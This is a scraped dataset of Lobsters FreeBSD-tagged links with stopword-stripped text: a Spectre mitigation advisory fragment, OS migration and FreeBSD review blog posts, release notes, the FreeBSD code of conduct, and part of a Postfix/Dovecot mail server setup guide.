sysctl sysctl vmpmappti vmpmappti default setting overridden setting loader tunable vmpmappti bootloaderconf setting take effect boot pti introduces performance regression observed performance loss significant microbenchmarks system call overhead much smaller many real workload spectre two common mitigation spectre patch includes mitigation using indirect branch restricted speculation feature available via microcode update processor manufacturer alternate mitigation retpoline feature available newer compiler feasibility applying retpoline stable branch andor release investigation patch includes ibrs mitigation spectre use mitigation system must updated microcode older microcode patched kernel function without mitigation ibrs disabled via hwibrsdisable sysctl tunable status checked via hwibrsactive sysctl ibrs may enabled disabled runtime additional detail microcode update follow following list contains correction revision number affected branch branchpath revision see file modified particular revision run following command replacing nnnnnn revision number machine subversion installed svn diff cnnnnnn summarize svn svnfreebsdorgbase visit following url replacing nnnnnn revision number vii reference latest revision advisory available begin pgp signature fqri end pgp signature
405,Lobsters,freebsd,FreeBSD,A Year Away From Mac OS,http://bitcannon.net/post/a-year-away-from-mac-os/,year away mac o,finding alternative mac o x january linux thing elementary o arch linux budgie gnome desktop environment work pc february settling gnome albert plank april new job found thinkpad pretty lacklustre gross dongle filco tkl three year old hardware august new laptop bought first nonapple personal laptop rust magsafe dell xps power connector embedded white led october freebsd desktop zfs official driver freebsd freebsd desktop howto update enpass pas gpg browser extension io client imported stardew valley recent progress running stardew valley openbsd march window eve v wesonwindows read rust cobalt scoop general observation missing apps moneywell update march bucket gnome notification wrap twitter http alvalinkpostreclaimyourabandonware void give back little number package arch user repository subscribe feed twitter mastodon supporting github sponsor read part,fifth post series finding alternative mac o x bit year ago wrote search alternative mac o switch linux post reflect year went detail adventure mac o alternative january linux thing originally choosing use elementary o full time grew frustrated aspect system switched arch linux bit time budgie eventually settled gnome desktop environment experiment going well also installed arch mac mini macbook pro addition work pc used primary o february settling gnome installed tool like albert plank gnome extension custom theme feel home gnome following month gave got comfortable environment run vanilla gnome desktop experience gnome extension mostly bad many tried suffered one issue memory leak flakiness broke gnomeshell generally low quality question choice building significant part shell javascript april new job april started new job given choice thinkpad macbook pro chose thinkpad run arch gnome found thinkpad pretty lacklustre run linux well devs work running linux devs macbooks mostly macbook one without touch bar two usbc port feeling modern macbooks reinforced seeing machine use daily basis macbook issued gross dongle connect external display use provide least one usba port usb port juggled external keyboard mouse dongle phone charger occasionally usb hard drive time shortage dongle melbourne people tried nonapple one proved flakey caused system instability apple choice fully embrace usbc completely ignored people actually need computer estimate macbooks office many people choose use crappy company supplied logitech keyboard macbook personally purchased filco tkl seen sort failure rate mentioned elsewhere still seen couple macbook keyboard fail short life one key become sticky unreliable space fall starting new job also meant chunky work pc came home replacing mac mini later sold mini price paid year ago one quad core one make go show people want machine whatever reason apple happy selling three year old hardware brand new price august new laptop august gained confidence switch going stick bought first nonapple personal laptop dell xps xps proven reliable wellbuilt fast screen continues impress top still manages hour battery life xps beast quad core ram ssd display discrete graphic fairly heavy laptop love choice thicker heavier machine want better battery life larger screen port forced compromise thinness lightness regularly work rust powerful machine compiling really helpful thing dislike xps probably power connector miss ease attachment feedback magsafe dell power connector barrel style connector led embedded led appears serve useful purpose always whether connected change colour turn charged dell xps power connector embedded white led october freebsd desktop continued lured bsd desktop stable base rolling package model system appealing prefer bsd style licensing flexibility guarantee zfs provides installed freebsd alongside arch xps laptop support wifi graphic power efficiency seems quite bit behind linux eventually realised could try running desktop pc component wellsupported including nvidia graphic card nvidia actually release official driver freebsd zfs like use whole disk one benefit generic desktop hardware upgradable invested trio samsung ssds added system installed freebsd zpool status pool zroot state online scan none requested config name state read write cksum zroot online online online online online error known data error df h filesystem size used avail capacity mounted zrootrootdefault freebsd desktop howto allison nicole reid proved especially helpful configuring system desktop use usual went gnome desktop unfortunately freebsd version gnome stuck two year old version part issue although miss improvement subsequent release fortunately version good hidpi support using display update october gnome freebsd port updated bringing two year development upgrade seamless working perfectly one hurdle using freebsd password management password manager using enpass support freebsd research settled pas replacement elegant solution password management tree file encrypted gpg shell script manage browser extension io client actual use surprisingly userfriendly imported password pas able access freebsd bonus password manager open source data selfhosted tracked git even various setting tweaked desktop freebsd experience seamless linux example starting gnome session gnomekeyringdaemon start appear called called desired effect run manually set agent environment variable also unable eliminate screen tearing firefox scrolling poked various setting remains initially missed playing game stardew valley freebsd consuming hour time week prior freebsd install extra friction rebooting arch run game basically stopped playing entirely bad thing recent progress running stardew valley openbsd could look porting enough side project though lesser degree also missed dropbox freebsd heavy dropbox user get dropbox website absence minor annoyance would nice freebsd version available march window january wrote regarding window say strongly biased towards nix style operating system find unlikely happy using window full time however interest keeping open mind give try next month backed eve v campaign eve v laptop tablet come window window table took lot longer expected v finally arrived february backed campaign december getting feel window machine pen offer still see making window primary o keep exploring tweeting adventure wesonwindows hash tag point attempt installing linux initial goal able replicate workflow updating read rust window feel like reasonable sample determine use window get real work done us following tool ssh git rust cobalt static site compiler makefile ruby little date script aws command line tool yet tried installing aws tool rest working powershell without window subsystem linux wsl tool installed scoop post v window future general observation missing apps october wrote migration away mac o x still going well rarely use mac o one remaining application yet find suitable replacement moneywell still case month open macbook balance finance track budget looked many alternative none nonweb based option could find envelope budgeting automatic distribution fund envelope based spending plan update march discovered bucket trialling moneywell replacement gnome opinion gnome desktop environment good mac o level polished part work well consistent cohesive uncluttered unobtrusive release made every month always improving however vein yyyy year linux desktop bit perpetual feeling next gnome release solve gripe part year eagerly awaiting release brought per display resolution setting allowing display used together ability adjust split position two window tiled next feature arrived suppose attention drawn thing getting never quite feel feature complete always feeling waitinglooking forward next release notification like notification handling gnome notification appear centred top screen super annoying assume slide make room subsequent notification filling middle screen instead replace current notification almost notification seem transient show notification panel several show quick succession see recent one mac o handle notification lot better wrap point see switching back mac o one task moneywell able achieve new linux freebsd system hopeful eventually able move one area using tool found suitable replacement twitter mar wezm omg happening immediate reaction interesting open source super cool post get abandoned mac twitter client support character tweet modifying assembly http alvalinkpostreclaimyourabandonware year think value operating system shifted went valuing design consistency attention detail definitely still value thing think softened willing settle rough edge return get system always date hardware option upgradeable hardware ability build environment work freedom study program work change computing wish last one come bit surprise always fan open source happy use wellmade proprietary software turn huge portion system open source perspective change jumping hoop install proprietary software system package repos kind drag feel sort wrong system also something wonderful public bug tracker search track progress issue instead submitting void say thanks wonderful software using free tried give back little financially code documentation contribution also maintain number package arch user repository hope submit first freebsd port distant future thanks following journey happy computing subscribe feed follow twitter mastodon update enjoyed post consider supporting github sponsor part series read part
406,Lobsters,freebsd,FreeBSD,Mac OS versus FreeBSD: A Comparative Evaluation,https://doi.org/10.1109/MC.2018.1451648,mac o versus freebsd comparative evaluation,forgot password,ieee continue sending helpful information product service please consent updated privacy policy accept sign forgot password
407,Lobsters,freebsd,FreeBSD,Unix Architecture Evolution from the 1970 PDP-7 to the 2018 FreeBSD,https://fosdem.org/2018/schedule/event/unix_evolution/,unix architecture evolution freebsd,github repository database recording evolution provided facility third fourth,unix operating system profound influence development open source software associated community many today system trace code design unnamed operating system kernel implemented line assembly language evolved unix operating system whose direct descendant include today bsd system intellectual heir form various gnulinux distribution architecture unix evolve past half century based github repository recording system history today database recording evolution provided facility reconstruction third fourth edition unix manual examine significant milestone development lesson learn many architectural feature layering system call device file interpreter process management already visible version idea followed quickly tree directory structure user contributed code io redirection shell user program group pipe scripting later version added domainspecific language environment variable documented file system hierarchy software package virtual memory support optimized screen handling networking storage pool dynamic tracing packet capture library based record facility documented year see area evolution continues unchanged pace area appears stalled also see one measure code complexity followed selfcorrecting path lesson derive amazing ride include durability early architectural feature value establishing convention imposition rigid mechanism importance addition made system gestation increasing difficulty bringing groundbreaking change unix age
409,Lobsters,freebsd,FreeBSD,nuster 1.7.9.5 released – A web caching proxy server based on HAProxy,https://github.com/jiangwenyuan/nuster/releases/tag/v1.7.9.5,nuster released web caching proxy server based haproxy,added changed reload reload,add cache manager api support enable disable cache run time added cache manager api cache manager applet enable disable cacherule run time changed rename cache applet change default share memory size perform action time signed another tab window reload refresh session signed another tab window reload refresh session
410,Lobsters,freebsd,FreeBSD,“Has Linux lost its way?” comments prompt Debian developer to revisit FreeBSD after 20 years (2015),http://changelog.complete.org/archives/9317-has-linux-lost-its-way-comments-prompt-a-debian-developer-to-revisit-freebsd-after-20-years,linux lost way comment prompt debian developer revisit freebsd year,freebsd debian modern linux lost way reaction value simplicity hear lxc maintainer tell lxc secure somewhat obscure instuctions highly experimental patchset make mention supported work many situation bhyve making mouse work best virtualbox known bug two platform fully supported explains pkg audit f debsecan explained ignored bug report advice freebsd handbook,admit soft spot freebsd freebsd first unix ran somewhere around year ago switched debian even still used freebsd handbook learn linux debian great reference anyhow comment recent post modern linux lost way reaction value simplicity plus latent desire see zfs fare freebsd caused try installed virtualbox debian old thinkpad sitting basement previously ran debian result mixture amazing disappointing say quite glad exist plenty innovation happening everywhere neat feature exist everywhere also come right say statement freebsd issue like linux false misleading many case running exact stack others better also others worse perhaps article might dispell bit fud surrounding jessie also showing nice thing freebsd conclusion jessie freebsd awesome free operating system wart article freebsd debian discus debian wart well experience initial reaction freebsd wow feel familiar reminds commercial unix maybe linux year ago minimal welldocumented base system everything pretty much logical place filesystem solid memory management felt right home almost reassuring even putting together freebsd box lot package installing config file editing freebsd handbook describing install x talk editing file feature like able learn directly thing fit together start remembering reason like linux year ago commercial unix maybe program like apache still well supported maybe default vi tendency corrupt terminal periodically perhaps root default shell csh perhaps lot package installing config file editing quite learning experience either thing like paste xml file obscure polkit location make mouse work something overall area freebsd kill way o unquestionably awesome several area whole bunch area good linux number area even polkit dbus hal using exact stack linux comment freebsd differently put together strike hollow frankly area need lot work make hard manage system secure stable way amazing let get used zfs much use o support something like right aware anything like zfs generally stable cost fortune pretty much unix zfs interested btrfs yet awesome picked freebsd rather netbsd openbsd zfs freebsd simply awesome integreated extremely well installer support root zfs even encrypted root zfs though neither default top freebsd system show line zfs arc cache stats right alongside everything else zfs default maximum cache size readahead etc autotune boot unless overridden based amount ram system system type seriously folk thought everything reek solid seen zfs well integrated outside solaristype os using zfsonlinux time mature zfs freebsd zol instance still memory tuning issue really suggested machine freebsd nail zfs freebsd even support trim available zol think fairly unique even among openzfs platform also support delegated administration filesystem user jail system seemingly similar solaris zone freebsd also support beadm like similar tool solaris let basically use zfs snapshot make lightweight boot environment select boot useful say upgrade jail linux tried hard get right fallen face many time person want take pity sometimes linuxvserver openvz lxc still none match freebsd jail done long time linux current jaildujour lxc though extremely difficult configure secure way even author comment hear lxc maintainer tell lxc secure pretty much requires apparmor profile achieve reasonable security still rather flux found last time tried lxc month ago confidence lxc secure say kvm freebsd simply low freebsd jail simple welldocumented lxc complex hard figure security fairly transparent easy control work well think lxc moving right direction might even get couple year quite skeptical even docker getting security completely right simply different people throwing around word distribution respect freebsd pcbsd etc recent year analogy perfect linux ecosystem kernel project libc project coreutils project udev project systemdsysvinitwhatever project etc get idea freebsd base system project one project cover kernel base userland use base system code pulled elsewhere maintained tree ssh completely homegrown kernel etc end nicelyintegrated base system always get upgraded sync linux world distribution maker responsible integrating bit everywhere coherent whole freebsd something toolkit build system gentoo might analogy linux side end spectrum ubuntu install work tweak later sort setup debian straddle middle ground offering approach many case pro con approach generally think either one better different notquitethere said lot thing freebsd linux let touch laptop support leaf something desired installed fewyearsold thinkpad basically best possible platform working suspend free o worked perfectly box debian year freebsd suspend work text mode x running video get corrupted system hang tried debug would also note suspend closed lid automatic freebsd somewhat obscure instuctions tell policykit pkla file edit make suspend work xfce incidentally also say policykit file edit make shutdownrestart option work storage subsystem also surprising miss rough version lvm luks mdraid called geom geom however support support software raid configuration linux mdraid comparison support etc seems highly experimental patchset floating around many year certainly integrated latest release kernel current documentation make mention although seems dated logical volume manager supported case seem wellsupported software like linux zfs level roughly however requires full use zfs zfs also support common operation like adding single disk existing group possible mdraid many implementation zfs limitation platform freebsd filesystem support rather miss support linux ext filesystems using actual linux code ripped gpl rewrote bsd license resulting driver really work filesystems work many situation frankly see bothered something bsdlicensed work filesystem old nobody us anymore two freebsd filesystems really useable zfs virtualization freebsd also present although support virtualbox open source edition really fullfeatured fast enough virtualization environment server option bhyve look something xen clone bhyve however support window guest requires hoop even boot linux guest installers several year least reach featureparity kvm today suspect one run freebsd guest number different virtualization system instruction making mouse work best virtualbox work may xorg reshuffle freebsd taken account installer nice fast situation one wonder little bit qa lock twice turn known bug reported month ago activity installer attempt use package manger set yet install optional doc guess devs installing doc testing nothing like dropbox freebsd apparently freebsd nothing like linux inotify linux dropbox work freebsd linux mode sketchy report people getting owncloud client work something akin rsync rather instantsync mode get working run dropbox wine apparently desktop environment tend need lot configuration work get going linux lot editing polkit hal dbus etc config file mentioned various place freebsd use lot component cause confusion linux really configure much box freebsd support many platform linux freebsd two platform fully supported see people refer list platform supported security support official release even built package includ arm powerpc bad package management roughly year ago one thing pulled debian perhaps spolied running distribution gold standard package management long find freebsd package management even pkgng lacking number important way start freebsd actually two different package management system one base system one call portspackages collection port way install source package way install binary related tree base system freebsdupdate install patch major upgrade also cron option automate sadly way automatically indicating calling script whether reboot necessary freebsdupdate really manages le dozen package though rest managed pkg pkg turn number issue biggest take week get security update freebsd handbook explains pkg audit f look installed package one base system alert package need update similar strippeddown version debian debsecan discovered pkg audit f showed vulnerability xorg pkg upgrade showed system uptodate documented handbook people mailing list explained workarounds laborious bad enough freebsd way automatically install security patch thing package collection debian several unattendedupgrades cronapt etc pkg upgrade upgrade everything system may quite bit want upgraded want run apache php want always apply security patch freebsd package job like debian pkg tool good errorhandling fact error handling seems nonexistent time noticed package failure install time pkg ignored marked package correctly installed noticed problem happened glance screen right moment message hundred package debian contrast failure end run get nice report package failed exit status use script also another issue debian resolved decade ago package script displaying message important administrator showing many scroll screen never seen submitted bug report one also thing make question design pkg trust accurately report installation succeeded show important info need see extent trust question testing portspackages seems automated test aside basically everyone running master branch portspackages like running debian unstable server distinctly uncomfortable notion though seems freebsd people report mostly work well issue freebsd port make distinction development runtime file like debian package virtue wanting run graphical desktop get static library include file build script etc xorg installed package concerned licensing freebsd package collection separate section like debian main contrib nonfree one big pot bsdlicense gpllicense proprietary without source license usrlocalsharelicenses look license package way freebsd like debian say never even show package dfsgfree useful instance running company make sure never install package personal use something bad abi stability used able run binary compiled year ago modern system generally possible linux assuming correct shared library available freebsd explicitly possible every major version upgrade must reinstall recompile every binary system necessarily showstopper hassle lot people update people comment pointing compat package port may help situation comment based advice freebsd handbook stating major version upgrade installed package port need upgraded directly tried handbook overstating need point may error conclusion said found little validation comment debian ecosystem noticeably worse freebsd one debian wart particularly keeping software uptodate see two project designed around different passion freebsd around base system debian around integrated whole system would wrong say either always better freebsd approach clearly produce leading feature especially jail zfs integration yet debian approach also produce leading feature way package management security maintainability beyond small base criticism excessive complexity polkitcgmanagerdbus area still stand people commenting freebsd lost way like linux would point freebsd mostly us component also freebsd excessive complexity portspackage system system management tool think draw pick best use case looking platform run single custom app perhaps debian package management benefit apply may even need freebsd package freebsd zfs support jail may well appeal looking run desktop environment server application need ton php python perl c library debian package management security handling may well attractive disappointed debian gnukfreebsd release architecture jessie project promise provide best world want jail tight zfs integration
411,Lobsters,freebsd,FreeBSD,Updated FreeBSD Code of Conduct,https://www.freebsd.org/internal/code-of-conduct.html,updated freebsd code conduct,freebsd code conduct freebsd community code conduct conduct freebsdorg reporting guide question conduct freebsdorg core freebsdorg draft coc django project,freebsd code conduct freebsd community code conduct freebsd community always worked welcoming respectful community want ensure nt change grow evolve end ground rule ask people adhere friendly patient welcoming considerate respectful careful word choose kind others disagree try understand nt exhaustive list thing ca nt rather take spirit intended guide make easier communicate participate community code conduct applies space managed freebsd project includes online chat mailing list bug tracker freebsd event developer meeting social forum created project community us communication applies communication conduct space including email chat thing say slide video poster sign even tshirts display space addition violation code outside space may rare case affect person ability participate within conduct amount egregious violation code believe someone violating code conduct ask report emailing conduct freebsdorg detail please see reporting guide friendly patient welcoming strive community welcome support people background identity includes limited member race ethnicity culture national origin color immigration status social economic class educational level sex sexual orientation gender identity expression age size family status political belief religion lack thereof mental physical ability considerate work used people turn depend work others decision take affect user colleague take consequence account remember worldwide community might communicating someone else primary language respectful u agree time disagreement excuse poor behavior poor manner might experience frustration allow frustration turn personal attack important remember community people feel uncomfortable threatened productive one member freebsd community respectful dealing member well people outside freebsd community careful word choose kind others insult put participant harassment exclusionary behavior nt acceptable includes limited violent threat language directed another person discriminatory joke language posting sexually explicit violent material posting threatening post people personally identifying information doxing personal insult especially using racist sexist term unwelcome sexual attention advocating encouraging behavior general someone asks stop stop persisting behavior asked stop considered harassment disagree try understand disagreement social technical happen time freebsd exception important resolve disagreement differing view constructively remember different strength freebsd come varied community people wide range background different people different perspective issue unable understand someone hold viewpoint nt mean wrong nt forget human err blaming nt get u anywhere instead focus helping resolve issue learning mistake question question please feel free contact freebsd code conduct committee emailing conduct freebsdorg freebsd core team core freebsdorg text based llvm project draft coc turn based django project code conduct turn based wording speak project
412,Lobsters,freebsd,FreeBSD,"EuroBSDcon 2018 – 20-23 Sept 2018 – Polytechnic University of Bucharest, Romania",https://2018.eurobsdcon.org/,eurobsdcon sept polytechnic university bucharest romania,,
413,Lobsters,freebsd,FreeBSD,OPNsense 18.1 released,https://opnsense.org/opnsense-18-1-released/,opnsense released,public key,hello good folk internet year opnsense driving innovation modularising hardening open source firewall simple reliable firmware upgrade multilanguage support hardenedbsd security fast adoption upstream software update well clear stable bsd licensing humbly present sum another major iteration opnsense firewall second half well change made release nicknamed groovy gecko notably firewall nat rule reworked flexible usable via plugins going pave way subsequent api work core firewall functionality detail please find attached list change upgrade track available later today please patient meltdown spectre patch currently worked freebsd reliable timeline keep date usual channel news become available hang prominent change since version freebsd php jquery migration realtek vendor nic driver version portable nat ipsec support local group restriction feature openvpn ipsec openvpn multiremote support client strict interface binding ssh web gui improved mvc tab general page layout shared forwarding work conjunction tryforwarding improved replyto multiwan behaviour easytouse update cache support linux window web proxy intrusion detection alert improvement plugin support new rulesets et pro snort vrt revamped haproxy plugin introduction page moved interface selection menu quick search firewall rule dhcp wireless status alias backend rewrite future extensibility plugincapable firewall nat rule migration system route ui backend mvc also available via api reverse dns support insight reporting also available via api fully rewritten firewall live log mvc also available via api new plugins zerotier mdnsrepeater collectd telegraf clamav cicap tor siproxd webproxysso webproxyuseracl postfix rspamd redis iperf arpscan zabbixproxy frr nodeexporter download link installation guide checksum image found well full list change version system recover static version php configuration file boot system show warning dialog editing web gui listening interface system allow dot certificate detail system remove workaround new bit mmap disallow default see firewall fix port range forward expansion firewall move alias directory persistent memory firewall fix alias resolve boot firewall revert vip gateway option pppoe interface interface fix header link list widget interface defer ip renewal boot installer full password recovery mode enables user set local authentication installer prevent mf transition install medium import network time use time server prefer first ui revert menu positioning improvement plugins osfreeradius add ldap search filter contributed michael muenz plugins oshaproxy contributed frank wall plugins osnodeexporter contributed david harrigan plugins ospostfix contributed michael muenz plugins osrspamd contributed fabian franz plugins ostelegraf add graphite graylog output contributed michael muenz src protect vlan pcp write sysctl src enable numbered user class id option dhclient src set default port carootnss port libressl port php port sudo port unbound image provided signature verified distributed public key openssl tmpimagesig openssl dgst verify rsapub signature tmpimagesig public key series begin public key end public key stay safe opnsense team
414,Lobsters,freebsd,FreeBSD,How To Run Your Own Mail Server,https://www.c0ffee.net/blog/mail-server-guide,run mail server,run mail server take back data postfix dovecot rspamd apache solr sieve suspend account opinion nt like freebsd overview dns record postfix mail transfer agent dovecot mail delivery agent solr fulltext search rspamd spam filtering dkim validation outgoing mail sieve scripting mailbox conclusion overview postfix rspamd milter dkim dkim section dovecot sieve solr ldap server imap idle mutt mail zpush edit sep got native push notification working io blog post dns record hidden master server host dns critically important reverse spf record postfix mail transfer agent man page dovecot section section postfix virtual readme apache directory studio ldapsearch b dcexamplecom oudomains dcexample dccom ldapsearch b uidalphonsus ouusers dcexample dccom dovecot mail delivery agent kmail testing mail server username password server port ssl username password email address server port ssl dkim section solr fulltext search guy blog previous section dovecot documentation rspamd spam filtering rspamd dspam offically abandoned since rbl check spf dkim dmarc dcc bulk mail check greylisting dkim signing outgoing mail automatic whitelisting reply someone web interface hyperscan redis official rspamd tutorial dcc daemon rspamd quick start guide documentation module postfix section dovecot guide dkim validation outgoing mail dkim builtin support dkim signing previous section rspamd section dmarc testing dkim dmarc spf dkimvalidatorcom sieve scripting mailbox dovecot section root awesomebox varmailvhostsexamplecomalphonsus l l sieveconnect conclusion roundcube back mail directory regularly reason selfhosting thing,run mail server guide selfhosting email freebsd using postfix dovecot rspamd ldap getting gmail one best way take back data face dragnet surveillance unfortunately also one difficult search run mail server many result tell simply difficult reliably luckily running mail server daunting many would believe email designed work email perhaps successful federated decentralized protocol ever exist shame allowed centralized monolithic advertising company obtain near monopoly great technology luckily spent last year tweaking mail server setup willing enable laziness spirit free open internet dive important caveat become sysadmin mail server screw something might able send receive email sure else fails admit defeat point mx record google apps account carry however run risk losing email interim going try make guide foolproof possible comfortable assuming responsibility might best leave expert way guide get opportunistic tl sendingreceiving email postfix access email anywhere using imap dovecot fast modern spam filtering rspamd fulltext search mailbox apache solr dkim spf dmarc record ensure outgoing mail spamfiltered statistical training spam filter based move inout junk folder custom email sortingfiltering using sieve running setup year found many aspect better gmail think spam filtering work better able write sieve script sort inbox godsend compared gmail convoluted filter system google occasionally seems suspend account opinion nt like peace mind mail system control final note run everything freebsd may massage command work linux flavor choice thing software used open source run equally well unixlike o overview dns record postfix mail transfer agent dovecot mail delivery agent solr fulltext search rspamd spam filtering dkim validation outgoing mail sieve scripting mailbox conclusion overview take deep breath feast eye convoluted rube goldberg machine email system soon bring lumbering life let walk architecture email whether sent received first go postfix mail transfer agent mta postfix responsible transferring email wherever supposed go recipient domain mailbox server postfix accept message delivery otherwise postfix relay message recipient mail server sending email someone connect postfix smtp mandatory starttls encryption port successfully validating username password postfix accept message relay recipient mail server smtp using opportunistic tl opportunistic mean use encryption side support fall back plaintext nt receiving email someone sender mail server connect postfix smtp opportunistic tl port basic security spam check like prohibiting unauthorized relaying ensuring side valid dns record place postfix accept message delivery whether message relayed sent email someone accepted delivery someone sent email first filtered rspamd milter milter term postfix mail filter incoming mail rspamd spam checking may flag message spam reject altogether outgoing mail rspamd take care dkim signing discussed dkim section accepted email make rspamd milter delivered dovecot mail delivery agent mda using local unix domain socket dovecot take email postfix store user mailbox mailbox stored filesystem different format maildir mbox commonly used dovecot provides remote access mailbox using imap protocol addition support automatic mail filtering using custom sieve script dovecot receives message first pass solr server index future fulltext search sieve script run automatically place mail xspam header user junk folder addition user move message junk folder dovecot inform rspamd retrain message spam ham ancient history setup expose email sslsecured imap run local ldap server allows use single username password selfhosted apps guide describe store mail credential email alias ldap however easy store information relational database flat file quick note dovecot support imap idle provides pseudopush functionality get notified new mail instantly work desktop mail client mutt o x mailapp nt supported mobile client android mail notable exception opensource implementation exchange activesync protocol called zpush integrates imap server provide push notification io android device ran zpush month enough small bug along hassle running php production make uninstall setting iphone check new mail every minute plenty fast still battery left end day however dead set instant email notification might something look work well enough nt find worth trouble edit sep got native push notification working io see blog post stepbystep guide finally example guide use examplecom domain nonroutable ip address obviously need acquire domain name public ip address mail server modify example accordingly command guide run root unless otherwise specified dns record first need set dns record mail server know send email use hidden master server host dns like edit zone file reload bind otherwise set record dns provider management portal probably want set low ttl around second verified everything working correctly annoying realize typed wrong ip address wait hour ttl expire order test first thing need mx record mx record tell mail server host running mail server given domain specify multiple mx record priority use fallback mail server primary one examplecom domain single mail server mailexamplecom zone file single mx record course need substitute ip address domain name usrlocaletcnamedmasterexamplecomdb ttl origin examplecom soa rootexamplecom mx mailexamplecom aaaa mail mail aaaa critically important reverse dns record mail server host reverse dns record point back mail server mail server may reject email spam normally set reverse dns record hosting provider web portal make sure set reverse dns address mail server mail server reverse dns fully qualified domain name nt match exactly hostname reverse dns probably resolve ip mx record best bet point straight back mail server hostname verify reverse dns record using dig command dig short x however reverse dns record place enough mail server accept mail also need set spf record mail server spf record technically required mail server work one place significantly reduces likelihood mail rejected spam spf record tell mail server host allowed send mail behalf domain case single mail server want others accept mail server spf record look like usrlocaletcnamedmasterexamplecomdb txt mx indicates mx record mailexamplecom allowed send mail examplecom mail coming anywhere else assumed spam rejected add spf definition txt record dns provider web portal without quote postfix mail transfer agent ready install configure software install package freebsd port substitute appropriate command package manager choice first bring everything date portsnap fetch portsnap update portmaster abd postfix responsible sending receiving mail domain smtp install port cd usrportsmailpostfix make install clean setup use following build option ldap pcre pgsql tl watched magic text scroll minute postfix installed navigate configuration directory edit config file freebsd software package port always installed usrlocal prefix etcpostfix linux cd usrlocaletcpostfix vim maincf maincf given brief commentary config option always check man page need detail something pretty standard virtual user setup rather host mail actual unix account server postfix use external database ldap case determine email address accept mail message accepted delivery postfix hand dovecot postfix also use dovecot auth mechanism authenticate smtp user configure ldap authentication dovecot section let postfix reuse set standard spamproofing security option well coming back file set rspamd section usrlocaletcpostfixmaincf compatibilitylevel biff mailspooldirectory varmaillocal myhostname mailexamplecom mydestination awesomeboxexamplecom localhostexamplecom localhost myorigin awesomeboxexamplecom disablevrfycommand yes yes showuserunknowntablename messagesizelimit mailboxsizelimit allowpercenthack swapbangpath recipientdelimiter smtpdtlscertfile usrlocaletcsslcertsmailexamplecomrsacrt smtpdtlskeyfile usrlocaletcsslcertsmailexamplecomrsakey smtpdtlseccertfile usrlocaletcsslcertsmailexamplecomecccrt smtpdtlseckeyfile usrlocaletcsslcertsmailexamplecomecckey smtpdtlseecdhgrade ultra smtptlscafileetcsslcertpem smtptlssecuritylevel dane smtpdnssupportlevel dnssec smtpbindaddress smtpdtlsmandatoryprotocols smtpdtlsmandatoryciphers high tlshighcipherlist smtpdtlssecuritylevel may tlsssloptions noticket nocompression smtpdtlssessioncachedatabase btree datadirectory smtpdtlscache smtptlssessioncachedatabase btree datadirectory smtptlscache smtpdsaslauthenable yes smtpdsaslpath privateauth smtpdsasltype dovecot smtpdtlsauthonly yes smtpdsaslsecurityoptions noanonymous noplaintext smtpdsasltlssecurityoptions noanonymous smtpdtlsreceivedheader yes smtpdhelorequired yes smtpdclientrestrictions permitmynetworks permitsaslauthenticated rejectunknownreverseclienthostname rejectunauthpipelining smtpdhelorestrictions permitmynetworks permitsaslauthenticated rejectinvalidhelohostname rejectnonfqdnhelohostname rejectunauthpipelining smtpdsenderrestrictions permitmynetworks permitsaslauthenticated rejectnonfqdnsender rejectunknownsenderdomain rejectunauthpipelining smtpdrelayrestrictions permitmynetworks permitsaslauthenticated rejectunauthdestination smtpdrecipientrestrictions permitmynetworks permitsaslauthenticated rejectnonfqdnrecipient rejectunknownrecipientdomain rejectunauthpipelining rejectunverifiedrecipient smtpddatarestrictions permitmynetworks permitsaslauthenticated rejectmultirecipientbounce rejectunauthpipelining virtualtransport lmtp unix privatedovecotlmtp virtualmailboxdomains ldap usrlocaletcpostfixldapvirtualmailboxdomainscf virtualmailboxmaps ldap usrlocaletcpostfixldapvirtualmailboxmapscf hash usrlocaletcpostfixsystemvirtualmailboxes virtualaliasmaps ldap usrlocaletcpostfixldapvirtualaliasmapscf need create file directory specified file mkdir varmaillocal chown root mail varmaillocal chmod varmaillocal openssl dhparam openssl dhparam chmod usrlocaletcssldh pem mastercf set servicespecific override option set maincf use file make encryption mandatory submission port change line smtp submission declaration need change anything else file usrlocaletcpostfixmastercf smtp inet n n smtpd smtpdsaslauthenableno submission inet n n smtpd smtpdtlssecuritylevelencrypt tlspreemptcipherlistyes need tell postfix user domain want accept mail use ldap file tell postfix query run get neccessary information check setup openldap another blog post need write want use flat file instead use hash instead ldap last three line maincf shown enter user domain alias plain text directly file compile postmap command could put information postgresql database plenty online tutorial well read detail postfix virtual readme anyway using ldap read nt spent much time perfecting ldap got personal single sign system working left robust ldap setup probably need tweak query first file specifies domain server accept mail usrlocaletcpostfixldapvirtualmailboxdomainscfserverhost ldapi searchbase oudomains dcexample dccom version bind queryfilter objectclassdnsdomain dc resultattribute dc next file specifies mailbox email address server accept mail usrlocaletcpostfixldapvirtualmailboxmapscfserverhost ldapi searchbase ouusers dcexample dccom version bind queryfilter objectclassinetlocalmailrecipient mail resultattribute mail last file specifies alias email address usrlocaletcpostfixldapvirtualmailboxaliasmapscfserverhost ldapi searchbase ouusers dcexample dccom version bind queryfilter objectclassinetlocalmailrecipient maillocaladdress resultattribute mail easiest way set user domain ldap set ssh tunnel server run apache directory studio see domain set query ldapsearch b dcexamplecom oudomains dcexample dccom extended ldif base dcexamplecom oudomains dcexample dccom scope subtree filter objectclass requesting examplecom domain examplecom dn dcexamplecom oudomains dcexample dccom dc examplecom objectclass dnsdomain objectclass top search result search result success numresponses numentries next query show user configured username specified uid parameter mail contains user primary mailbox maillocaladdress entry specifies email alias user ldapsearch b uidalphonsus ouusers dcexample dccom extended ldif base uidalphonsus ouusers dcexample dccom scope subtree filter objectclass requesting alphonsus user examplecom dn uidalphonsus ouusers dcexample dccom cn alphonsus liguori givenname alphonsus mail alphonsus examplecom maillocaladdress administrator examplecom maillocaladdress root examplecom maillocaladdress postmaster examplecom church triumphant objectclass person objectclass organizationalperson objectclass inetorgperson objectclass inetlocalmailrecipient sn liguori uid alphonsus displayname alphonsus liguori userpassword search result search result success numresponses numentries file place start postfix freebsd need disable sendmail daemon included default base enable postfix start boot etcrcconfsendmailenable none postfixenable yes kill sendmail start postfix service sendmail onestop service postfix start check output varlogmaillog error also sure enable tcp traffic port firewall almost everything need need working postfix installation need get dovecot running postfix somewhere deliver mail luckily dovecot little le arcane set dovecot mail delivery agent dovecot provide imap access mailbox access email remotely multiple device easily installed port freebsd cd usrportsmaildovecot make install clean use following build option server kqueue ldap pgsql icu solr sure install dovecotpiegeonhole well order get sieve filtering cd usrportsmaildovecotpigeonhole make install clean use ldap managesieve option server managesieve protocol allows edit sieve script email client unfortunately client know support functionality kmail nt messed yet dovecot installed need create vmail user handle mail virtual user also need create directory store virtual mail use separate attachment directory dovecot never 